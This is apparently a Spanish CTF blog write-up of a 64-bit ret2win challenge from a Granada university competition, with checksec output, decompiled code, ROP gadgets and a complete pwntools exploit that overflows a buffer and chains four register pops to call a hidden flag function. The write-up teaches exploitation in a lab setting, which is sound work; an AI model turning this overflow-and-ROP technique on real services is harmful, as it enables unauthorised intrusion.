---
layout: post
title: Pwn UGR CTF
comments: true
categories: [Pwn, Writeups, UGRCTF]
---

El día de hoy hemos participado en la competición de CTF organizada por la Cátedra de Ciberseguridad de INCIBE-Universidad de Granada. En cuanto a la compatición, bien organizada y con retos interesantes, al menos durante la primera jornada. Hemos logrado clasificar a la siguiente fase, por lo que, cuando finalice, hablaré de la competición en general.

![Image]({{ site.baseurl }}/images/posts/UGR-Logo.png)

# Overview

Se nos presenta una especie de juego de *piedra, papel, tijeras*, que contiene una función a la que nunca se llama y que checkea el valor de varios parámetros que deben pasársele. En resumen, un *ret2win* de 64 bits con parámetros.

# Reconocimiento

Antes de empezar, debemos lanzar *pwninit* para enlazar el binario con la libc y el linker que se nos dan:

```bash
pwninit --binary pwn --glibc libc.so.6 --ld ld-linux-x86-64.so.2
```

Una vez podemos ejecutar, lanzamos checksec:

```
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
RUNPATH:    b'./glibc/'
Stripped:   No
```

Vemos que no podremos ejecutar código del stack debido al **bit NX**. Ahora, descompilamos con ghidra:

```c
undefined8 main(void)
{
  int iVar1;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  banner();
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  fflush(stdout);
  printf(&DAT_004028b0);
  fflush(stdout);
  read(0,&local_28,0x77);
  iVar1 = strncmp((char *)&local_28,"piedra",6);
  if (iVar1 == 0) {
    flag();
    exit(0);
  }
  puts("\nPreparando juego..");
  return 0;
}
```

Vemos que tenemos un buffer overflow en *read*, además, parece que si introducimos *`piedra`* nos dará una flag, aunque es falsa. Vemos también una función *game*:

```c
void game(long param_1,long param_2,long param_3,long param_4)
{
  ssize_t sVar1;
  char local_d;
  int local_c;
  
  local_c = open("./flag.txt",0);
  if (local_c < 0) {
    perror("\nError\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (param_1 != 0xdeadc0fe) {
    printf("Primer juego! %s%sLo siento!\n\nAdios..\n","piedra","tijera");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (param_2 != 0xdeadbeef) {
    printf("Segundo juego!: %s%s%sLo siento!\n\nAdios..\n","papel","piedra","tijera");
                    /* WARNING: Subroutine does not return */
    exit(2);
  }
  if (param_3 != 0xbabe1337) {
    printf("Tercer juego!: %s%s%s%sLo siento!\n\nAdios..\n","papel","piedra","tijera","piedra");
                    /* WARNING: Subroutine does not return */
    exit(3);
  }
  if (param_4 != 0xac00ff33) {
    printf("Tercer juego!: %s%s%s%s%sLo siento!\n\nAdios..\n","papel","piedra","tijera","piedra",
           "papel");
                    /* WARNING: Subroutine does not return */
    exit(4);
  }
  printf("%s\n\nHas conseguido ganar!\n\nAqui tienes la flag: ","papel");
  fflush(stdin);
  fflush(stdout);
  while( true ) {
    sVar1 = read(local_c,&local_d,1);
    if (sVar1 < 1) break;
    fputc((int)local_d,stdout);
  }
  close(local_c);
  fflush(stdin);
  fflush(stdout);
  return;
}
```

Esta función parece que sí nos dará la flag real. Sin embargo, tendremos que pasar los parámetros utilizando [***ROP***]({% post_url 2024-08-15-ROP %}). Por suerte, tenemos todos los gadgets necesarios:

```bash
ropper --file pwn
```
```
0x0000000000401521: pop rcx; ret; 
0x0000000000401527: pop rdi; ret; 
0x0000000000401523: pop rdx; ret; 
0x0000000000401525: pop rsi; ret;
...
0x0000000000401016: ret;
```

# Explotación

Ya tenemos todo, podemos calcular el offset hasta el RIP y crear un script:

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("pwn_patched")
libc = ELF("glibc/libc.so.6")
ld = ELF("glibc/ld-linux-x86-64.so.2")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("18.170.107.169", 1337)
    return r


#0x000000000040121f  game
game = p64(0x000000000040121f)

#0x0000000000401527: pop rdi; ret;
pop_rdi = p64(0x0000000000401527)
#0x0000000000401525: pop rsi; ret;
pop_rsi = p64(0x0000000000401525)
#0x0000000000401523: pop rdx; ret;
pop_rdx = p64(0x0000000000401523)
#0x0000000000401521: pop rcx; ret;
pop_rcx = p64(0x0000000000401521)

#0x0000000000401016: ret;
ret = p64(0x0000000000401016)

offset = 40

def main():

    r = conn()

    r.recvuntil("|--$")
    
    payload = offset*b'A'
    payload += pop_rdi + p64(0xdeadc0fe)
    payload += pop_rsi + p64(0xdeadbeef)
    payload += pop_rdx + p64(0xbabe1337)
    payload += pop_rcx + p64(0xac00ff33)
    payload += ret                          #Para alinear el stack
    payload += game

    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
```

Como véis un reto sencillito pero se agradece ver algún ejercicio de pwn en este tipo de competiciones. Mañana veremos que depara la final!